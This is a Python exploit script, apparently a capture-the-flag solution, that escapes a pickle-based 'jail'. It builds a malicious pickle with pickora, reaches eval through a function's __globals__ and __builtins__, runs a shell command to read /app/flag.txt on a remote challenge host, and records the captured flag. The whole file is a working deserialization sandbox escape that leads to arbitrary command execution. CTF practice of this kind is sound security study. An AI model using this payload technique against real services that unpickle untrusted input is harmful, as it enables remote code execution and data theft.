from pwn import *
import os

io = remote('13.38.208.179', 11944)
# io = process(['python3', './src/app.py'])

malicious_code = '''
dict_get = GLOBAL("jail", "Jail.run.__globals__.__class__.get")
globals = GLOBAL("jail", "Jail.run.__globals__")
builtins = dict_get(globals, "__builtins__")
eval = dict_get(builtins, "eval")
eval("__import__('os').system('cat /app/flag.txt')")
'''

open('/tmp/payload.py', 'w').write(malicious_code)
os.system('pickora /tmp/payload.py -o /tmp/payload.pkl')
bytescodes = open('/tmp/payload.pkl', 'rb').read()

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'What is there ?\n', bytescodes.hex().encode())
io.interactive()

# flag{AlLw@y5_Us3_@_Wh1t3LiSt_Inst3@d_0f__BlacKl1sT}